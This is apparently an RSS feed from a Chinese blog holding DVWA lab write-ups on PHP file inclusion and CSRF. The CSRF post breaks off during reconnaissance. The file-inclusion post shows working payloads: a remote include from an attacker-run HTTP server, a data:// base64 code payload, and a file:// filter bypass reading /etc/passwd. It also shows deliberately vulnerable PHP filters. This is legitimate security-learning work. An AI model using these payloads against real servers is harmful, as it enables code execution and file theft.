<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>DVWA on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/dvwa/</link><description>Recent content in DVWA on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Tue, 26 Apr 2022 15:07:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/dvwa/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-文件包含</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-04/</link><pubDate>Tue, 26 Apr 2022 15:07:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-04/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>这次玩一下 DVWA 的文件包含。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;h3 id="php和include">PHP和include&lt;/h3>
&lt;p>在 php 语言中 &lt;code>include&lt;/code> 表达式用于包含指定的文件，写过 C/C++ 应该对 &lt;code>#include&lt;/code> 预处理指令比较熟，php 的 &lt;code>include&lt;/code> 表达式和 &lt;code>#include&lt;/code> 在某种程度上很相似，都是从指定的搜索路径里找到文件并“包含”进来。被包含的文件可以是 php 文件也可以是别的文件，这点和 &lt;code>#include&lt;/code> 预处理器比较像。&lt;/p>
&lt;p>然后，因为 &lt;code>include&lt;/code> 可以写做表达式的缘故，在 php 里可以 &lt;code>include $file&lt;/code>，如果把用户传入的数据未经过检查就交给 &lt;code>include&lt;/code> 的话就可能产生一个文件包含漏洞。&lt;/p>
&lt;blockquote>
&lt;p>当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在&lt;a class="link" href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener"
>有效的 PHP 起始和结束标记&lt;/a>之中。&lt;/p>
&lt;/blockquote>
&lt;p>解释器的这个行为进一步拓宽了可利用的范围。&lt;/p>
&lt;blockquote>
&lt;p>如果“&lt;a class="link" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener"
>URL include wrappers&lt;/a>”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见&lt;a class="link" href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener"
>支持的协议和封装协议&lt;/a>）而不是本地文件来指定要被包含的文件。&lt;/p>
&lt;/blockquote>
&lt;p>对 &lt;code>include&lt;/code> 参数有足够控制的情况下，可以利用远程包含来执行任意代码。挑选合适的 url 协议可以 bypass 不够严谨的参数检查。&lt;/p>
&lt;h3 id="本地文件包含">本地文件包含&lt;/h3>
&lt;p>本地文件包含一般可以是 &lt;code>include &amp;quot;some/folder/&amp;quot; . $_GET[&amp;quot;file&amp;quot;] . &amp;quot;.php&amp;quot;&lt;/code> 或类似的形式，此时可以通过 &lt;code>file=../../malicious&lt;/code> 这样的 payload 来包含任意代码。&lt;/p>
&lt;h3 id="远程文件包含">远程文件包含&lt;/h3>
&lt;p>此时对 &lt;code>include&lt;/code> 参数有更强的控制，也可以通过 url 协议来远程包含 php 代码执行。或者 &lt;code>zlib://&lt;/code> 之类的协议直接把要执行的代码放在 payload 里。&lt;/p>
&lt;h2 id="文件包含">文件包含&lt;/h2>
&lt;h3 id="信息收集">信息收集&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609.png"
width="694"
height="206"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140326609"
class="gallery-image"
data-flex-grow="336"
data-flex-basis="808px"
>&lt;/p>
&lt;p>页面没有什么特别的，点击上面的 &lt;code>file1.php&lt;/code>、&lt;code>file2.php&lt;/code>、&lt;code>file3.php&lt;/code> 能分别看到三个不同的子页面：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312.png"
width="681"
height="289"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140433312"
class="gallery-image"
data-flex-grow="235"
data-flex-basis="565px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863.png"
width="686"
height="294"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140441863"
class="gallery-image"
data-flex-grow="233"
data-flex-basis="560px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138.png"
width="692"
height="345"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140450138"
class="gallery-image"
data-flex-grow="200"
data-flex-basis="481px"
>&lt;/p>
&lt;p>注意地址栏会发现有意思的地方：&lt;/p>
&lt;ul>
&lt;li>首页：http://localhost:8080/vulnerabilities/fi/?page=index.php&lt;/li>
&lt;li>file1：http://localhost:8080/vulnerabilities/fi/?page=file1.php&lt;/li>
&lt;li>file2：http://localhost:8080/vulnerabilities/fi/?page=file2.php&lt;/li>
&lt;li>file3：http://localhost:8080/vulnerabilities/fi/?page=file3.php&lt;/li>
&lt;/ul>
&lt;p>很直接地想到 &lt;code>index.php&lt;/code>、&lt;code>file1.php&lt;/code>、&lt;code>file2.php&lt;/code>、&lt;code>file3.php&lt;/code>就是被包含的文件了。尝试提交一个 &lt;code>page=file4.php&lt;/code>，发现彩蛋。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383.png"
width="675"
height="158"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426140828383"
class="gallery-image"
data-flex-grow="427"
data-flex-basis="1025px"
>&lt;/p>
&lt;p>直接观察 dvwa 源码，可以发现 &lt;code>include&lt;/code> 出现的位置是 &lt;code>dvwa/vulnerabilities/fi/index.php&lt;/code> 里，&lt;code>php.ini&lt;/code> 配置的 &lt;code>include_path&lt;/code> 应该是包含当前目录 &lt;code>.&lt;/code> 的，所以可以直接取相对路径包含任意文件。&lt;/p>
&lt;p>差不多就是这样了。&lt;/p>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>因为已经有一个 phpinfo 页面，我们先尝试包含一下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540.png"
width="1266"
height="325"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426141056540"
class="gallery-image"
data-flex-grow="389"
data-flex-basis="934px"
>&lt;/p>
&lt;p>好的，直接成功。下一个问题是怎么 get shell。考虑服务在 docker 内，apache 的日志都链接到了 &lt;code>/dev/stdout&lt;/code> 和 &lt;code>/dev/stderr&lt;/code>，通过包含日志来执行代码是不行了。上传文件暂不考虑（因为还没开始做任意文件上传），故考虑下远程文件包含和利用url协议。&lt;/p>
&lt;p>先试一下远程文件包含。&lt;code>python3 -m http.server&lt;/code>开个 http 服务器，下面放个 &lt;code>2.php&lt;/code>，然后构造 url：&lt;code>http://localhost:8080/vulnerabilities/fi/?page=http://172.17.0.1:8000/2.php&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274.png"
width="1323"
height="287"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426142642274"
class="gallery-image"
data-flex-grow="460"
data-flex-basis="1106px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="提高难度medium">提高难度：Medium&lt;/h3>
&lt;p>看看 Medium 难度下的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// The page we wish to display
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Input validation
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;http://&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;https://&amp;#34;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;../&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;..&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用 &lt;code>str_replace&lt;/code> 替换掉了 &lt;code>../&lt;/code> 和 &lt;code>http://&lt;/code> 来解决目录穿越和 http 文件包含。但 php 支持的 url 协议显然不止这俩&amp;hellip;&lt;/p>
&lt;p>改成&lt;code>data://&lt;/code>协议，重写一个 payload：&lt;code>http://localhost:8080/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=&lt;/code>。这段 base64 是 &lt;code> echo '&amp;lt;?php phpinfo(); ?&amp;gt;' | base64&lt;/code> 产生的。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441.png"
width="1271"
height="330"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426143248441"
class="gallery-image"
data-flex-grow="385"
data-flex-basis="924px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="提高难度high">提高难度：High&lt;/h3>
&lt;p>High 难度下使用了 &lt;code>fnmatch&lt;/code> 匹配文件名，但模式是 &lt;code>file*&lt;/code>，所以还是有完蛋的可能。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="c1">// The page we wish to display
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Input validation
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">fnmatch&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;file*&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;include.php&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// This isn&amp;#39;t the page we want!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR: File not found!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先试一下能不能用&lt;code>file://&lt;/code>来 bypass 掉这个模式匹配。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394.png"
width="1044"
height="320"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426143800394"
class="gallery-image"
data-flex-grow="326"
data-flex-basis="783px"
>&lt;/p>
&lt;p>好的，成功 bypass 掉了这个模式，并且包含 &lt;code>/etc/passwd&lt;/code> 成功了。不过&lt;code>/etc/shadow&lt;/code>就没权限了。&lt;/p>
&lt;p>后续利用需要一个值得被包含的文件，如果服务器上有 mysql 配置之类的文件而且能读的话包含也不错。如果有上传点的话可以尝试传个马再包含。&lt;/p>
&lt;p>我太菜，虽然本地文件包含找出来了，想不到怎么用服务器上已有的文件去 get shell，日志包含又不可用。&lt;/p>
&lt;h3 id="帮助文档">帮助文档&lt;/h3>
&lt;p>差不多三个难度都解好了，接着看下帮助文档拓宽下思路。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Objective&lt;/strong>&lt;/p>
&lt;p>Read all five famous quotes from &amp;lsquo;&lt;a class="link" href="http://localhost:8080/hackable/flags/fi.php" target="_blank" rel="noopener"
>../hackable/flags/fi.php&lt;/a>&amp;rsquo; using only the file inclusion.&lt;/p>
&lt;/blockquote>
&lt;p>哦？目标是获取 &lt;code>hackable&lt;/code>下的 flag。稍改下 payload 很快就拿到了&lt;code>fi.php&lt;/code>的内容。&lt;/p>
&lt;blockquote>
&lt;p>1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don&amp;rsquo;t know.&lt;/p>
&lt;p>&amp;ndash;LINE HIDDEN ;)&amp;ndash;&lt;/p>
&lt;p>4.) The pool on the roof must have a leak.&lt;/p>
&lt;/blockquote>
&lt;p>这个 &lt;code>LINE HIDDEN&lt;/code> 有点怪，不是说 &lt;code>five famous quotes&lt;/code> 吗，这只有4条。于是看了眼 &lt;code>fi.php&lt;/code>，发现是这样的=。=并不是没完全拿到flag。我寻思要完全拿到的话可以在 get shell 之后把 &lt;code>fi.php&lt;/code> 下载下来，不然单纯包含这个文件肯定是不行的。&lt;/p>
&lt;p>impossible 难度代码长这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="c1">// The page we wish to display
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Only allow include.php or file{1..3}.php
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;include.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file1.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file2.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file3.php&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// This isn&amp;#39;t the page we want!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR: File not found!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>硬编码了所有可能的文件，如此一来就没有利用空间了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>文件包含这题感觉有点emmm&lt;/p>
&lt;p>怎么说呢，DVWA的题好像都有点简单过头的样子=。=虽然我是这么想但感觉作为一个才开始接触安全方面，学习时间一星期不到的人来说说出这话有点不应该，膨胀了。&lt;/p>
&lt;p>因为种种原因吧，感觉今年的自己特别焦躁。工资还只有这么点，事事不顺。一边劝自己知足，换工作不会改善现状，一边又焦虑自己一无所成。&lt;/p>
&lt;p>烦心。&lt;/p></description></item><item><title>DVWA上手记录-CSRF</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</link><pubDate>Mon, 25 Apr 2022 16:33:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>这次看下 DVWA 的 CSRF 题。&lt;/p>
&lt;p>昨天忙完了工作，闲下来的时间顺便看了下 DVWA 的部署。在我的 fork 分支里添加了 docker 支持。因为是纯新增，不太可能有 breaking change，直接在 GitHub 网页点点鼠标就能同步上游代码。这样就能用上最新的 DVWA 同时享受 docker 一键启动 DVWA 环境的快乐了。&lt;/p>
&lt;p>用法很简单：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git clone https://github.com/nnnewb/dvwa
&lt;span class="nb">cd&lt;/span> dvwa
docker-compose up -d --build
&lt;/code>&lt;/pre>&lt;/div>&lt;p>就这样！&lt;/p>
&lt;p>当然还有可能遇到一些网络问题，什么&lt;code>deb.debian.org&lt;/code>访问慢或者&lt;code>timeout&lt;/code>、&lt;code>connection reset&lt;/code>之类的，但我觉得想玩这个的多少得有点自己动手解决问题的能力吧，不能跟三岁小孩一样等别人喂嘴里。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;h3 id="利用方式">利用方式&lt;/h3>
&lt;p>CSRF 全名是跨站请求伪造 &lt;em>Cross Site Request Forgery&lt;/em> 。&lt;/p>
&lt;p>简单地说，服务器相信收到的请求是用户控制浏览器发起的，是出于用户自身的意图做某些操作。但实际上，是另一个恶意网站的 js 脚本控制了用户的浏览器，在用户不知情的情况下，冒充用户的身份请求服务器做一些并非出自用户本意的操作。&lt;/p>
&lt;p>CSRF 利用中有三个组成部分：&lt;/p>
&lt;ul>
&lt;li>用户浏览器&lt;/li>
&lt;li>目标服务器&lt;/li>
&lt;li>恶意网站&lt;/li>
&lt;/ul>
&lt;p>用户不访问恶意网站，CSRF 攻击就无从谈起。&lt;/p>
&lt;h3 id="和cors的关系">和CORS的关系&lt;/h3>
&lt;p>说没关系其实也有。CORS全称是 &lt;em>Cross Origin Resource Sharing&lt;/em>，跨域资源共享，也是防浏览器被恶意网站控制着，背着用户拿自己的数据。但有所不同的是，CORS 其实是相当宽松的，因为 CORS 只要求浏览器对 “复杂请求” 发送预检，但简单请求（注意哦，包括 POST 请求，但只能包含指定的 Header 和限定的 &lt;code>Content-Type&lt;/code>）会直接呈交给服务器。&lt;/p>
&lt;p>而且这个请求是可以带 Cookies 的，也就是说只要接口满足条件（接受限定的 &lt;code>Content-Type&lt;/code>，对 Header 没有要求），CORS 策略就没法阻止 CSRF 攻击。&lt;/p>
&lt;p>举一个更实际的例子，哪怕恶意网站只是写了一个简单的表单：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">form&lt;/span> &lt;span class="na">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;POST&amp;#34;&lt;/span> &lt;span class="na">action&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://good.com/some/action&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">input&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;text&amp;#34;&lt;/span> &lt;span class="na">value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;hello&amp;#34;&lt;/span>&lt;span class="p">/&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">button&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;submit&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>submit&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">button&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>也满足 CORS 对于 &lt;em>简单请求&lt;/em> 的定义，浏览器不会阻止或预检。&lt;/p>
&lt;p>因此，即使配置良好的 CORS，也无法杜绝 CSRF 攻击。但 CORS 确实是防御 CSRF 攻击的重要环节。&lt;/p>
&lt;h3 id="防御">防御&lt;/h3>
&lt;p>防御CSRF攻击说难不难，因为&lt;a class="link" href="https://portswigger.net/web-security/CSRF" target="_blank" rel="noopener"
>发起 CSRF 攻击有几个重要前提&lt;/a>：&lt;/p>
&lt;ul>
&lt;li>基于 Cookies 的会话控制&lt;/li>
&lt;li>没有不可预测的请求参数&lt;/li>
&lt;/ul>
&lt;p>基于上面两点：&lt;/p>
&lt;p>如果会话控制存在于自定义的 HTTP 头或 Cookies 之外的 HTTP 头（比如&lt;code>Authorization&lt;/code>），那么 CORS 就会要求先发出一个预检请求，只有在服务器返回 &lt;code>Access-Control-Allow-Origin&lt;/code> 包含当前域名的时候才会正式发出请求。这样一来除非先 bypass CORS ，不然就无法发起 CSRF 攻击。&lt;/p>
&lt;p>另一种就是增加一个攻击者不可预测的参数，也就是常说的 CSRF Token。&lt;/p>
&lt;p>CSRF Token 是一个和会话绑定的随机（至少对攻击者来说不可预知的）字符串（或别的数据类型）。CSRF 的作用原理依然是要依靠 CORS，恶意网站如果要伪造请求提交一个表单，那就必须拿到 CSRF Token，想获取 CSRF Token 就必须拿到表单所在的页面，而请求表单页面就必须满足 CORS 策略——即使是简单请求，没有预检，浏览器在收到响应后也会根据 &lt;code>Access-Control-Allow-Origin&lt;/code> 的设定拒绝给 XHR 返回数据。网页拿不到 CSRF Token，自然也就没办法伪造出请求。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="信息收集">信息收集&lt;/h3>
&lt;p>好的，就是踩点。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113359872.png"
width="694"
height="384"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113359872_hu9f65ffe27ceedc88d5a5d4b939cdbb89_29651_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113359872_hu9f65ffe27ceedc88d5a5d4b939cdbb89_29651_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113359872"
class="gallery-image"
data-flex-grow="180"
data-flex-basis="433px"
>&lt;/p>
&lt;p>一个修改密码的页面，只有登陆用户能修改自己的密码（因为不登陆根本看不到这个页面）。另外还提供了一个测试登陆的地方，就是那个 &lt;em>Test Credentials&lt;/em> 按钮。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113529432.png"
width="602"
height="462"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113529432_hu6562a17a4cfa6d40103e315209b7dae1_19442_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113529432_hu6562a17a4cfa6d40103e315209b7dae1_19442_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113529432"
class="gallery-image"
data-flex-grow="130"
data-flex-basis="312px"
>&lt;/p>
&lt;p>在测试登陆这里输入自己的用户名密码（默认是 &lt;code>admin&lt;/code>,&lt;code>password&lt;/code>）会提示&lt;code>valid password for 'admin'&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113619471.png"
width="602"
height="462"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113619471_hu7a377251ca067ccef2deefe4b718b765_20140_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113619471_hu7a377251ca067ccef2deefe4b718b765_20140_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113619471"
class="gallery-image"
data-flex-grow="130"
data-flex-basis="312px"
>&lt;/p>
&lt;p>修改密码的地方我们也试一试。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113707665.png"
width="681"
height="359"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113707665_hu83b45cf6d41374fdab532da43f4da5fb_27229_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113707665_hu83b45cf6d41374fdab532da43f4da5fb_27229_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113707665"
class="gallery-image"
data-flex-grow="189"
data-flex-basis="455px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113713949.png"
width="691"
height="361"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113713949_hub982db786f97e05051e2c58967ba7a51_22558_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113713949_hub982db786f97e05051e2c58967ba7a51_22558_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113713949"
class="gallery-image"
data-flex-grow="191"
data-flex-basis="459px"
>&lt;/p>
&lt;p>修改后提示 &lt;code>Password changed&lt;/code>，观察下 F12 调试器里的请求和响应头。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143614395.png"
width="1008"
height="449"
